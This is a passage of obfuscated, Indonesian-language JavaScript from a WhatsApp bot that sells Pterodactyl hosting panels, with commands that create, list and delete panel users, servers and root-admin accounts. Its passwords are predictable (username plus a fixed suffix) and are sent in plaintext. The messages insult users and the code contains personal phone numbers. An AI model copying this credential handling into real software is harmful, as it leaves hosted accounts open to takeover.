            return _0x1d3510("Penggunaan " + (_0x137417 + _0x53d4d1) + " nomor\nContoh " + (_0x137417 + _0x53d4d1) + " 6285156726377");
          }
          bro = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          unp = _0x37e54b.indexOf(bro);
          _0x37e54b.splice(unp, 1);
          fs3.writeFileSync("./database/owner.json", JSON.stringify(_0x37e54b));
          _0x1d3510("Nomor " + bro + " Telah Di Hapus Own Panel!");
        }
        break;
      case "addpt":
        {
          if (!_0x1220c9) {
            return _0x1d3510(mess.only.owner);
          }
          if (!_0x18d0e5[0]) {
            return _0x1d3510("Penggunaan " + (_0x137417 + _0x53d4d1) + " nomor\nContoh " + (_0x137417 + _0x53d4d1) + " 62838072690");
          }
          prrkek = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          let _0x3f149c = await _0x221ba4.onWhatsApp(prrkek);
          if (_0x3f149c.length == 0) {
            return _0x1d3510("Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp Yah Kontol!!!");
          }
          _0x157ab2.push(prrkek);
          fs3.writeFileSync("./database/partner.json", JSON.stringify(_0x157ab2));
          _0x1d3510("Nomor " + prrkek + " Telah Menjadi PT Panel!");
        }
        break;
      case "delpt":
        {
          if (!_0x1220c9) {
            return _0x1d3510(mess.only.owner);
          }
          if (!_0x18d0e5[0]) {
            return _0x1d3510("Penggunaan " + (_0x137417 + _0x53d4d1) + " nomor\nContoh " + (_0x137417 + _0x53d4d1) + " 6285156726377");
          }
          bro = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          unp = _0x157ab2.indexOf(bro);
          _0x157ab2.splice(unp, 1);
          fs3.writeFileSync("./database/partner.json", JSON.stringify(_0x157ab2));
          _0x1d3510("Nomor " + bro + " Telah Di Hapus PT Panel!");
        }
        break;
      case "addgcseller":
        if (!_0x1220c9) {
          return;
        }
        if (!_0x2ec274) {
          return _0x1d3510("kushus grup!");
        }
        if (!_0x1220c9) {
          return _0x1d3510(mess.only.owner);
        }
        _0x1d6b8e.push(_0x4611fa.chat);
        fs3.writeFileSync("./database/unli.json", JSON.stringify(_0x1d6b8e));
        _0x1d3510("Berhasil addgcseller");
        break;
      case "delgcseller":
        {
          if (!_0x2ec274) {
            return _0x1d3510("kushus grup!");
          }
          if (!_0x1220c9) {
            return _0x1d3510(mess.only.owner);
          }
          _0x1d6b8e.splice(_0x4611fa.chat);
          fs3.writeFileSync("./database/unli.json", JSON.stringify(_0x1d6b8e));
          _0x1d3510("Berhasil Delgcseller");
        }
        break;
      case "alamdareen":
        if (!_0x1220c9) {
          return;
        }
        if (!_0x2ec274) {
          return _0x1d3510("kushus grup!");
        }
        if (!_0x1220c9) {
          return _0x1d3510(mess.only.owner);
        }
        _0x1d6b8e.push(_0x4611fa.chat);
        fs3.writeFileSync("./database/unli.json", JSON.stringify(_0x1d6b8e));
        _0x1d3510("Seluruh member grup kini telah menjadi murbug");
        break;
      case "hapusalam":
        {
          if (!_0x2ec274) {
            return _0x1d3510("kushus grup!");
          }
          if (!_0x1220c9) {
            return _0x1d3510(mess.only.owner);
          }
          _0x1d6b8e.splice(_0x4611fa.chat);
          fs3.writeFileSync("./database/unli.json", JSON.stringify(_0x1d6b8e));
          _0x1d3510("Seluruh member grup sudah tidak lagi menjadi murbug");
        }
        break;
      case "ramlist":
        lrm = "RAM BANG Dáreen Albérich𓆰⸸𓆪, YANG TERSEDIA :\n\n.1GB nama,62xxxx\n.2GB nama,62xxxx\n.3GB nama,62xxxx\n.4GB nama,62xxxx\n.5GB nama,62xxxx\n.6GB nama,62xxxx\n.7GB nama,62xxxx\n.8GB nama,62xxxx\n.9GB nama,62xxxx\n.10GB nama,62xxxx\n.unli nama,62xxxx\n\nSelamat Berjualan :)\n";
        const _0xc44971 = {
          text: lrm
        };
        const _0x2e80c3 = {
          quoted: _0x4611fa
        };
        _0x221ba4.sendMessage(_0x1dd769, _0xc44971, _0x2e80c3);
        break;
      case "panel":
        {
          const _0x1c831f = wek = "*⊷ SCRIPT BY : Dáreen Albérich𓆰⸸𓆪*\n*⊷ BOT NAME : Dáreen Albérich𓆰⸸𓆪-BOTZ*\n*⊷ PENGGUNA NAME : " + botname + "*\n*⊷ BUY SC : 6285156726377*\n*⊷ BUY BOT : 6285156726377*\n";
          let _0x1b87d8 = [{
            title: "Cara Pembuatan panel",
            highlight_label: "List Ram Panel",
            rows: [{
              title: "1gb",
              description: ".1gb user,nowa",
              id: ".1gb"
            }, {
              title: "2gb",
              description: ".2gb user,nowa",
              id: ".2gb"
            }, {
              title: "3gb",
              description: ".3gb user,nowa",
              id: ".3gb"
            }, {
              title: "4gb",
              description: ".4gb user,nowa",
              id: ".4gb"
            }, {
              title: "5gb",
              description: ".5gb user,nowa",
              id: ".5gb"
            }, {
              title: "6gb",
              description: ".6gb user,nowa",
              id: ".6gb"
            }, {
              title: "7gb",
              description: ".7gb user,nowa",
              id: ".7gb"
            }, {
              title: "8gb",
              description: ".8gb user,nowa",
              id: ".8gb"
            }, {
              title: "9gb",
              description: ".9gb user,nowa",
              id: ".9gb"
            }, {
              title: "10gb",
              description: ".10gb user,nowa",
              id: ".10gb"
            }, {
              title: "unli",
              description: ".unli user,nowa",
              id: ".unli"
            }]
          }];
          const _0x12d2e3 = {
            title: "Prelist Panel",
            sections: _0x1b87d8
          };
          let _0x49be7b = _0x12d2e3;
          const _0x321cf5 = {
            text: wek
          };
          const _0x2d1432 = {
            video: zanss
          };
          let _0x333039 = generateWAMessageFromContent(_0x4611fa.chat, {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [_0x4611fa.sender],
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                      newsletterJid: "120363267533195844@newsletter",
                      newsletterName: "SC BY Dáreen Albérich𓆰⸸𓆪",
                      serverMessageId: -1
                    },
                    businessMessageForwardInfo: {
                      businessOwnerJid: _0x221ba4.decodeJid(_0x221ba4.user.id)
                    }
                  },
                  body: proto.Message.InteractiveMessage.Body.create(_0x321cf5),
                  footer: proto.Message.InteractiveMessage.Footer.create({
                    text: _0x40ee63("SC CREATE PANEL BY Dáreen Albérich𓆰⸸𓆪✅")
                  }),
                  header: proto.Message.InteractiveMessage.Header.create({
                    title: "Welcome bos",
                    subtitle: "dcdXdino",
                    hasMediaAttachment: true,
                    ...(await prepareWAMessageMedia(_0x2d1432, {
                      upload: _0x221ba4.waUploadToServer
                    }))
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      name: "single_select",
                      buttonParamsJson: JSON.stringify(_0x49be7b)
                    }, {
                      name: "cta_url",
                      buttonParamsJson: "{\"display_text\":\"Creator\",\"url\":\"https://wa.me/6289603693479\",\"merchant_url\":\"https://wa.me/6289603693479\"}"
                    }, {
                      name: "cta_url",
                      buttonParamsJson: "{\"display_text\":\"Subscribe\",\"url\":\"https://www.youtube.com/@Dáreen Albérich𓆰⸸𓆪s\",\"merchant_url\":\"https://www.youtube.com/@Dáreen Albérich𓆰⸸𓆪s\"}"
                    }]
                  })
                })
              }
            }
          }, {});
          await _0x221ba4.relayMessage(_0x333039.key.remoteJid, _0x333039.message, {
            messageId: _0x333039.key.id
          });
        }
        break;
      case "listsrv":
        {
          if (!_0x1220c9 && !_0x4e5faa) {
            return _0x1d3510("Maaf, Anda tidak dapat melihat daftar server cuma BANG Dáreen Albérich𓆰⸸𓆪, yang bisa.");
          }
          let _0x2648e9 = _0x18d0e5[0] ? _0x18d0e5[0] : "1";
          let _0x3627ef = await fetch(domain + "/api/application/servers?page=" + _0x2648e9, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          let _0x56a4c4 = await _0x3627ef.json();
          let _0x55923c = _0x56a4c4.data;
          let _0x48fdd2 = [];
          let _0x29ac50 = "Berikut adalah daftar servernya BANG Dáreen Albérich𓆰⸸𓆪,:\n\n";
          for (let _0x5df71b of _0x55923c) {
            let _0x4502e0 = _0x5df71b.attributes;
            let _0x784ef1 = await fetch(domain + "/api/client/servers/" + _0x4502e0.uuid.split`-`[0] + "/resources", {
              method: "GET",
              headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + capikey
              }
            });
            let _0x4f70a8 = await _0x784ef1.json();
            let _0x5e4df3 = _0x4f70a8.attributes ? _0x4f70a8.attributes.current_state : _0x4502e0.status;
            _0x29ac50 += "ID Server: " + _0x4502e0.id + "\n";
            _0x29ac50 += "Nama Server: " + _0x4502e0.name + "\n";
            _0x29ac50 += "Status: " + _0x5e4df3 + "\n\n";
            _0x29ac50 += "BY Dáreen Albérich𓆰⸸𓆪";
          }
          _0x29ac50 += "Halaman: " + _0x56a4c4.meta.pagination.current_page + "/" + _0x56a4c4.meta.pagination.total_pages + "\n";
          _0x29ac50 += "Total Server: " + _0x56a4c4.meta.pagination.count;
          const _0xf3903a = {
            text: _0x29ac50
          };
          await _0x221ba4.sendMessage(_0x4611fa.chat, _0xf3903a, {
            quoted: _0x4611fa
          });
          if (_0x56a4c4.meta.pagination.current_page < _0x56a4c4.meta.pagination.total_pages) {
            _0x1d3510("Gunakan perintah " + _0x137417 + "listsrv " + (_0x56a4c4.meta.pagination.current_page + 1) + " untuk melihat halaman selanjutnya.");
          }
        }
        break;
      case "listusr":
        {
          if (!_0x1220c9 && !_0x4e5faa) {
            return _0x1d3510(mess.only.premium);
          }
          let _0x9e352d = _0x18d0e5[0] ? _0x18d0e5[0] : "1";
          let _0x5a5bd3 = await fetch(domain + "/api/application/users?page=" + _0x9e352d, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          let _0x395f5d = await _0x5a5bd3.json();
          let _0x4e2122 = _0x395f5d.data;
          let _0x34fcf4 = "Berikut list usernya BANG Dáreen Albérich𓆰⸸𓆪,:\n\n";
          for (let _0x1fb01f of _0x4e2122) {
            let _0x274e94 = _0x1fb01f.attributes;
            _0x34fcf4 += "ID: " + _0x274e94.id + " - Status: " + (_0x274e94.attributes?.user?.server_limit === null ? "Inactive" : "Active") + "\n";
            _0x34fcf4 += _0x274e94.username + "\n";
            _0x34fcf4 += _0x274e94.first_name + " " + _0x274e94.last_name + "\n\n";
            _0x34fcf4 += "Dáreen Albérich𓆰⸸𓆪XD";
          }
          _0x34fcf4 += "Page: " + _0x395f5d.meta.pagination.current_page + "/" + _0x395f5d.meta.pagination.total_pages + "\n";
          _0x34fcf4 += "Total Users: " + _0x395f5d.meta.pagination.count;
          const _0x16def4 = {
            text: _0x34fcf4
          };
          await _0x221ba4.sendMessage(_0x4611fa.chat, _0x16def4, {
            quoted: _0x4611fa
          });
          if (_0x395f5d.meta.pagination.current_page < _0x395f5d.meta.pagination.total_pages) {
            _0x1d3510("Gunakan perintah " + _0x137417 + "listsrv " + (_0x395f5d.meta.pagination.current_page + 1) + " untuk melihat halaman selanjutnya.");
          }
        }
        break;
      case "delsrv":
        {
          if (!_0x1220c9 && !_0x4e5faa) {
            return _0x1d3510("KHUSUS BANG Dáreen Albérich𓆰⸸𓆪, TOLOL");
          }
          let _0xea0fe4 = _0x18d0e5[0];
          if (!_0xea0fe4) {
            return _0x1d3510("ID nya mana?");
          }
          let _0x55ab7a = await fetch(domain + "/api/application/servers/" + _0xea0fe4, {
            method: "DELETE",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          let _0x3420af = _0x55ab7a.ok ? {
            errors: null
          } : await _0x55ab7a.json();
          if (_0x3420af.errors) {
            return _0x1d3510("*SERVER NOT FOUND BANG Dáreen Albérich𓆰⸸𓆪,*");
          }
          _0x1d3510("*SUCCESSFULLY DELETE THE SERVER BANG Dáreen Albérich𓆰⸸𓆪,*");
        }
        break;
      case "delusr":
        {
          if (!_0x1220c9) {
            return _0x1d3510("KHUSUS BANG Dáreen Albérich𓆰⸸𓆪, TOLOL");
          }
          let _0x589f40 = _0x18d0e5[0];
          if (!_0x589f40) {
            return _0x1d3510("ID nya mana?");
          }
          let _0x1db935 = await fetch(domain + "/api/application/users/" + _0x589f40, {
            method: "DELETE",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          let _0x3aa61e = _0x1db935.ok ? {
            errors: null
          } : await _0x1db935.json();
          if (_0x3aa61e.errors) {
            return _0x1d3510("*USER NOT FOUND BANG Dáreen Albérich𓆰⸸𓆪,*");
          }
          _0x1d3510("*SUCCESSFULLY DELETE THE USER BANG Dáreen Albérich𓆰⸸𓆪,*");
        }
        break;
      case "webpanel":
        {
          const _0x31a583 = "" + domain;
          const _0x2dec36 = {
            mentionedJid: [_0x228fe0],
            forwardingScore: 9999,
            isForwarded: true
          };
          const _0x1f213b = {
            image: {
              url: "https://files.catbox.moe/m6wbpq.jpg"
            },
            caption: _0x31a583,
            fileLength: 10,
            contextInfo: _0x2dec36
          };
          const _0x538a61 = {
            quoted: _0x4611fa
          };
          _0x221ba4.sendMessage(_0x1dd769, _0x1f213b, _0x538a61);
        }
        break;
      case "addusr":
        {
          if (!_0x1220c9 && !_0x4e5faa) {
            return _0x1d3510("KHUSUS BANG Dáreen Albérich𓆰⸸𓆪, TOLOL");
          }
          let _0x119358 = _0x3e94bb.split(",");
          if (_0x119358.length < 1) {
            return _0x1d3510("*Format salah!*\n\nPenggunaan:\n" + (_0x137417 + _0x53d4d1) + " username,number/tag");
          }
          let _0x5f1cd1 = _0x119358[1];
          let _0x17b8c1 = _0x4611fa.quoted ? _0x4611fa.quoted.sender : _0x119358[1] ? _0x119358[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : _0x4611fa.mentionedJid[0];
          if (!_0x17b8c1) {
            return _0x4611fa.reply("*Format salah!*\n\nPenggunaan:\n" + (_0x137417 + _0x53d4d1) + " username,number/tag");
          }
          let _0x498324 = (await _0x221ba4.onWhatsApp(_0x17b8c1.split`@`[0]))[0] || {};
          let _0x81bcb0 = _0x498324.exists ? crypto2.randomBytes(5).toString("hex") : _0x119358[3];
          let _0x4b6fbe = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              email: _0x5f1cd1 + "@Dáreen Albérich𓆰⸸𓆪",
              username: _0x5f1cd1,
              first_name: _0x5f1cd1,
              last_name: "Memb",
              language: "en",
              password: _0x81bcb0.toString()
            })
          });
          let _0x12619e = await _0x4b6fbe.json();
          if (_0x12619e.errors) {
            return _0x1d3510(JSON.stringify(_0x12619e.errors[0], null, 2));
          }
          let _0x1c6954 = _0x12619e.attributes;
          let _0x1e1116 = await _0x221ba4.sendMessage(_0x4611fa.chat, {
            text: "\n*SUCCESSFULLY ADD USER*\n\n  INFO USER\n*⥁**ID* : " + _0x1c6954.id + "\n*⥁**USERNAME* : " + _0x1c6954.username + "\n*⥁**EMAIL* : " + _0x1c6954.email + "\n*⥁**NAME* : " + _0x1c6954.first_name + " " + _0x1c6954.last_name + "\n*⥁**CREATED AT* :  " + vF6 + "\n*⥁**PASSWORD BERHASIL DI KIRIM KE @" + _0x17b8c1.split`@`[0] + "*",
            mentions: [_0x17b8c1]
          });
          _0x221ba4.sendMessage(_0x17b8c1, {
            text: "*BERIKUT DETAIL AKUN PANEL ANDA*\n\n  INFO USER\n*⥁**USERNAME* : " + _0x5f1cd1 + "\n*⥁**PASSWORD* : " + _0x81bcb0.toString() + "\n*⥁**LOGIN* : " + domain + "\n*⥁**INFO PANEL* : https://whatsapp.com/channel/0029VaZjmLq2v1IyjGKp6P0U\n*⥁**TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n"
          });
        }
        break;
      case "cadmin":
        {
          if (!_0x1220c9 && !_0x4e5faa) {
            return _0x1d3510("*KHUSUS BANG Dáreen Albérich𓆰⸸𓆪, TOLOL*");
          }
          if (!_0x1220c9) {
            return _0x1d3510(mess.owner);
          }
          let _0x46681 = q.split(",");
          let _0x3e1faf = _0x46681[0];
          let _0x3e98af = _0x46681[0];
          let _0x9d9475 = _0x46681[1];
          if (_0x46681.length < 2) {
            return _0x1d3510("*Format salah!*\nPenggunaan:\n" + (_0x137417 + _0x53d4d1) + " user,nomer");
          }
          if (!_0x3e98af) {
            return _0x1d3510("Ex : " + (_0x137417 + _0x53d4d1) + " Username,@tag/nomor\n\nContoh :\n" + (_0x137417 + _0x53d4d1) + " example,@user");
          }
          if (!_0x9d9475) {
            return _0x1d3510("Ex : " + (_0x137417 + _0x53d4d1) + " Username,@tag/nomor\n\nContoh :\n" + (_0x137417 + _0x53d4d1) + " example,@user");
          }
          let _0x323f8d = _0x3e98af + "Dáreen Albérich𓆰⸸𓆪";
          let _0x57d405 = _0x9d9475.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          let _0x3039b0 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              email: _0x3e98af + "@Dáreen Albérich𓆰⸸𓆪",
              username: _0x3e98af,
              first_name: _0x3e98af,
              last_name: "Memb",
              language: "en",
              root_admin: true,
              password: _0x323f8d.toString()
            })
          });
          let _0x2c272c = await _0x3039b0.json();
          if (_0x2c272c.errors) {
            return _0x4611fa.reply(JSON.stringify(_0x2c272c.errors[0], null, 2));
          }
          let _0x17406a = _0x2c272c.attributes;
          let _0x39b872 = "\nTYPE: user\n\n*🗃️*ID: " + _0x17406a.id + "\n*✅*USERNAME: " + _0x17406a.username + "\n*📩*EMAIL: " + _0x17406a.email + "\n*📌*NAME: " + _0x17406a.first_name + " " + _0x17406a.last_name + "\n*🌍*LANGUAGE: " + _0x17406a.language + "\n*💻*ADMIN: " + _0x17406a.root_admin + "\n*🚬*CREATED AT: " + _0x17406a.created_at + "\n";
          const _0x16ede1 = {
            text: _0x39b872
          };
          const _0x4cc3d8 = _0x16ede1;
          await _0x221ba4.sendMessage(_0x4611fa.chat, _0x4cc3d8);
          await _0x221ba4.sendMessage(_0x57d405, {
            text: "*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n\n\n*🗃️USERNAME* : " + _0x17406a.username + "\n*🔒PASSWORD* : " + _0x323f8d + "\n*🚬LOGIN* : " + domain + "\n\n*📦INFO PANEL* : https://chat.whatsapp.com/FKgszhQiJsE1h21GIDylOU\n*🔑TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*\n\n\n"
          });
        }
        break;
      case "listadmin":
        {
          if (!_0x1220c9 && !_0x4e5faa) {
            return _0x1d3510("Maaf, Anda tidak dapat melihat daftar pengguna.");
          }
          let _0x31d9a0 = _0x18d0e5[0] ? _0x18d0e5[0] : "1";
          let _0x25d48a = await fetch(domain + "/api/application/users?page=" + _0x31d9a0, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          let _0x11b4ae = await _0x25d48a.json();
          let _0x4bcdf8 = _0x11b4ae.data;
          let _0x3680bb = "Berikut list admin BY Dáreen Albérich𓆰⸸𓆪:\n\n";
          for (let _0x50621b of _0x4bcdf8) {
            let _0x3e0f6b = _0x50621b.attributes;
            if (_0x3e0f6b.root_admin) {
              _0x3680bb += "ID: " + _0x3e0f6b.id + " - Status: " + (_0x3e0f6b.attributes?.user?.server_limit === null ? "Inactive" : "Active") + "\n";
              _0x3680bb += _0x3e0f6b.username + "\n";
              _0x3680bb += _0x3e0f6b.first_name + " " + _0x3e0f6b.last_name + "\n\n";
              _0x3680bb += "BY Dáreen Albérich𓆰⸸𓆪";
            }
          }
          _0x3680bb += "Page: " + _0x11b4ae.meta.pagination.current_page + "/" + _0x11b4ae.meta.pagination.total_pages + "\n";
          _0x3680bb += "Total Admin: " + _0x11b4ae.meta.pagination.count;
          const _0x2ddc7a = {
            text: _0x3680bb
          };
          await _0x221ba4.sendMessage(_0x4611fa.chat, _0x2ddc7a, {
            quoted: _0x4611fa
          });
          if (_0x11b4ae.meta.pagination.current_page < _0x11b4ae.meta.pagination.total_pages) {
            _0x4611fa.reply("Gunakan perintah " + _0x137417 + "listusr " + (_0x11b4ae.meta.pagination.current_page + 1) + " untuk melihat halaman selanjutnya.");
          }
        }
        break;
      case "1gb":
        {
          if (!_0x1220c9 && !_0x428d53 && !_0x313f24 && !_0x4e5faa) {
            return _0x1d3510(mess.only.premium);
          }
          let _0x32bd0a = _0x3e94bb.split(",");
          if (_0x32bd0a.length < 2) {
            return _0x4611fa.reply("*Format salah!*\nPenggunaan:\n" + (_0x137417 + _0x53d4d1) + " user,nomer");
          }
          let _0x4cd24f = _0x32bd0a[0];
          let _0x3a0685 = _0x4611fa.quoted ? _0x4611fa.quoted.sender : _0x32bd0a[1] ? _0x32bd0a[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : _0x4611fa.mentionedJid[0];
          let _0x314958 = _0x4cd24f + "1gb";
          let _0xdbe03e = global.eggsnya;
          let _0x366d1a = global.location;
          let _0xe63f6a = "1024";
          let _0x5a712d = "30";
          let _0x54f490 = "1024";
          let _0x2b760b = _0x4cd24f + "1398@Dáreen Albérich𓆰⸸𓆪.com";
          akunlo = "https://files.catbox.moe/m6wbpq.jpg";
          if (!_0x3a0685) {
            return;
          }
          let _0x54baa8 = (await _0x221ba4.onWhatsApp(_0x3a0685.split`@`[0]))[0] || {};
          let _0x3622bf = _0x4cd24f + "Dáreen Albérich𓆰⸸𓆪";
          const _0x3459a6 = {
            email: _0x2b760b,
            username: _0x4cd24f,
            first_name: _0x4cd24f,
            last_name: _0x4cd24f,
            language: "en",
            password: _0x3622bf
          };
          let _0x5f11cc = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify(_0x3459a6)
          });
          let _0x496bfc = await _0x5f11cc.json();
          if (_0x496bfc.errors) {
            return _0x4611fa.reply(JSON.stringify(_0x496bfc.errors[0], null, 2));
          }
          let _0x50d7f8 = _0x496bfc.attributes;
          let _0x17e599 = await fetch(domain + "/api/application/nests/5/eggs/" + _0xdbe03e, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          _0x4611fa.reply("𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐑𝐄𝐀𝐓𝐄 𝐘𝐎𝐔𝐑 𝐏𝐀𝐍𝐄𝐋\n *DONE CRATE USER + SERVER ID :* " + _0x50d7f8.id + "\nJANGAN LUPA DI PAKE YAH ASU\nKALO NGGA NANTI DI DI DELETE BANG Dáreen Albérich𓆰⸸𓆪,\n> Dáreen Albérich𓆰⸸𓆪 Cpanel");
          ctf = "Hai @" + _0x3a0685.split`@`[0] + "\n\n*➣ USERNAME* : " + _0x50d7f8.username + "\n*➣ PASSWORD* : " + _0x3622bf + "\n*➣ LOGIN* : " + domain + "\n*➥ INFO PANEL* : https://whatsapp.com/channel/0029VaZjmLq2v1IyjGKp6P0U\n*➥TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n➻ NOTE : \n⪩ BOT HANYA MENGIRIM DATA AKUN 1X\n⪩ DILARANG KERAS MEMBAGIKAN LINK LOGIN\n⪩ GARANSI 20 DAY\n⪩ WAJIB BAWA BUKTI TRANSAKSI JIKA CLAIM GARANSI\n⪩ SCREENSHOT CHAT DATA AKUN INI AGAR TIDAK HILANG\n> Dáreen Albérich𓆰⸸𓆪 Cpanel";
          const _0x4c5c1e = {
            url: akunlo
          };
          const _0x320af2 = {
            image: _0x4c5c1e,
            caption: ctf
          };
          _0x221ba4.sendMessage(_0x3a0685, _0x320af2, {
            quoted: _0x221ba4.chat
          });
          let _0x3e5f20 = await _0x17e599.json();
          let _0x1eea06 = _0x3e5f20.attributes.startup;
          const _0x13fcd5 = {
            memory: _0xe63f6a,
            swap: 0,
            disk: _0x54f490,
            io: 500,
            cpu: _0x5a712d
          };
          let _0x4cf0d6 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x314958,
              description: " ",
              user: _0x50d7f8.id,
              egg: parseInt(_0xdbe03e),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0x1eea06,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: _0x13fcd5,
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 1
              },
              deploy: {
                locations: [parseInt(_0x366d1a)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x4fee61 = await _0x4cf0d6.json();
          if (_0x4fee61.errors) {
            return _0x4611fa.reply(JSON.stringify(_0x4fee61.errors[0], null, 2));
          }
          let _0x220cce = _0x4fee61.attributes;
          let _0x56189c = await _0x4611fa.reply("Dáreen Albérich𓆰⸸𓆪 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐌𝐁𝐔𝐀𝐓 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐊𝐀𝐌𝐔✔\n\n📩ID: " + _0x50d7f8.id + "\n📌NAME: " + _0x50d7f8.first_name + " " + _0x50d7f8.last_name + "\n💵MEMORY: " + (_0x220cce.limits.memory === 0 ? "Unlimited" : _0x220cce.limits.memory) + " MB\n📦DISK: " + (_0x220cce.limits.disk === 0 ? "Unlimited" : _0x220cce.limits.disk) + " MB\n⌛CPU: " + _0x220cce.limits.cpu + "%\n\n> © Dáreen Albérich𓆰⸸𓆪 Cpanel\n");
        }
        break;
      case "2gb":
        {
          if (!_0x1220c9 && !_0x428d53 && !_0x313f24 && !_0x4e5faa) {
            return _0x1d3510(mess.only.premium);
          }
          let _0x4e847d = _0x3e94bb.split(",");
          if (_0x4e847d.length < 2) {
            return _0x4611fa.reply("*Format salah!*\nPenggunaan:\n" + (_0x137417 + _0x53d4d1) + " user,nomer");
          }
          let _0x344751 = _0x4e847d[0];
          let _0x5eb747 = _0x4611fa.quoted ? _0x4611fa.quoted.sender : _0x4e847d[1] ? _0x4e847d[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : _0x4611fa.mentionedJid[0];
          let _0x391d05 = _0x344751 + "2gb";
          let _0x503bac = global.eggsnya;
          let _0x2a1c4c = global.location;
          let _0x102e4b = "2048";
          let _0x16d2d5 = "50";
          let _0x449461 = "2048";
          let _0x2ec732 = _0x344751 + "@Dáreen Albérich𓆰⸸𓆪";
          akunlo = "https://files.catbox.moe/m6wbpq.jpg";
          if (!_0x5eb747) {
            return;
          }
          let _0x5f51f0 = (await _0x221ba4.onWhatsApp(_0x5eb747.split`@`[0]))[0] || {};
          let _0x1f4021 = _0x344751 + "Dáreen Albérich𓆰⸸𓆪";
          const _0x51fe62 = {
            email: _0x2ec732,
            username: _0x344751,
            first_name: _0x344751,
            last_name: _0x344751,
            language: "en",
            password: _0x1f4021
          };
          let _0xdf2c34 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify(_0x51fe62)
          });
          let _0x384e08 = await _0xdf2c34.json();
          if (_0x384e08.errors) {
            return _0x4611fa.reply(JSON.stringify(_0x384e08.errors[0], null, 2));
          }
          let _0x363d0e = _0x384e08.attributes;
          let _0x522c5c = await fetch(domain + "/api/application/nests/5/eggs/" + _0x503bac, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          _0x4611fa.reply("𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐑𝐄𝐀𝐓𝐄 𝐘𝐎𝐔𝐑 𝐏𝐀𝐍𝐄𝐋\n *DONE CRATE USER + SERVER ID :* " + _0x363d0e.id + "\nJANGAN LUPA DI PAKE YAH ASU\nKALO NGGA NANTI DI DI DELETE BANG Dáreen Albérich𓆰⸸𓆪,\n> Dáreen Albérich𓆰⸸𓆪 Cpanel");
          ctf = "Hai @" + _0x5eb747.split`@`[0] + "\n\n*➣ USERNAME* : " + _0x363d0e.username + "\n*➣ PASSWORD* : " + _0x1f4021 + "\n*➣ LOGIN* : " + domain + "\n*➥ INFO PANEL* : https://whatsapp.com/channel/0029VaZjmLq2v1IyjGKp6P0U\n*➥TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n➻ NOTE : \n⪩ BOT HANYA MENGIRIM DATA AKUN 1X\n⪩ DILARANG KERAS MEMBAGIKAN LINK LOGIN\n⪩ GARANSI 20 DAY\n⪩ WAJIB BAWA BUKTI TRANSAKSI JIKA CLAIM GARANSI\n⪩ SCREENSHOT CHAT DATA AKUN INI AGAR TIDAK HILANG\n> Dáreen Albérich𓆰⸸𓆪 Cpanel\n";
          const _0xd6c594 = {
            url: akunlo
          };
          const _0x7dbee0 = {
            image: _0xd6c594,
            caption: ctf
          };
